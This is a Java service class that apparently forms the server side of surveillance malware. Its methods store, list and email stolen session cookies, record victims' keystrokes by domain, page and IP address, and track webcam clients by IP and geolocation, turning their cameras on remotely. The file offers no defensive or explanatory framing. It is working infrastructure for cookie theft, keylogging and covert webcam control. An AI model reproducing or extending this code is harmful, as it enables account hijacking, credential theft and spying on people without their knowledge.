package com.eh.openshiftapp.service;

import java.sql.SQLException;
import java.text.ParseException;
import java.util.List;

import com.eh.openshiftapp.dao.ApplicationDao;
import com.eh.openshiftapp.model.KeyloggedUser;
import com.eh.openshiftapp.model.UserCookie;
import com.eh.openshiftapp.model.Webcam;
import com.eh.openshiftapp.utility.Smtp;

public class ApplicationService {
	final ApplicationDao applicationDao = new ApplicationDao();

	public void insertCookie(String username, String cookie) throws SQLException {
		applicationDao.insertCookie(username, cookie);
	}

	public void deleteCookie() throws SQLException {
		applicationDao.deleteCookie();
	}

	public List<UserCookie> retrieveCookie() throws SQLException {
		List<UserCookie> userCookieList = applicationDao.retrieveCookie();
		return userCookieList;
	}

	public void sendCookieEmail(String subject, String message) {
		Smtp.sendCookieEmail(subject, message);
	}

	public void logPressedKey(String domain, String page, String pressedKey, String clientIP, String clientTime) throws SQLException {
		applicationDao.logPressedKeys(domain, page, pressedKey, clientIP, clientTime);
	}

	public List<KeyloggedUser> getKeyloggedUsers(String logDate) throws SQLException {
		List<KeyloggedUser> keyloggedUserList = applicationDao.getKeyloggedUsers(logDate);
		return keyloggedUserList;
	}

	public String getKeylogs(String logDate, String clientIP, String domain) throws SQLException, ParseException {
		String keylogs = applicationDao.getKeylogs(logDate, clientIP, domain);
		return keylogs;
	}

	public List<KeyloggedUser> getDetailedKeylogs(String logDate, String clientIP, String domain)
			throws SQLException, ParseException {
		List<KeyloggedUser> KeyloggedUserList = applicationDao.getDetailedKeylogs(logDate, clientIP, domain);
		return KeyloggedUserList;
	}

	public Webcam getWebcamInstruction(String clientIP, String geoLocation) throws SQLException {
		Webcam webcam = applicationDao.getWebcamInstruction(clientIP, geoLocation);
		return webcam;
	}

	public List<Webcam> getWebcamClients() throws SQLException {
		List<Webcam> webcamList = applicationDao.getWebcamClients();
		return webcamList;
	}

	public void webcamSwitch(String clientIP, String turnOnCam) throws SQLException {
		applicationDao.webcamSwitch(clientIP, turnOnCam);
	}
}
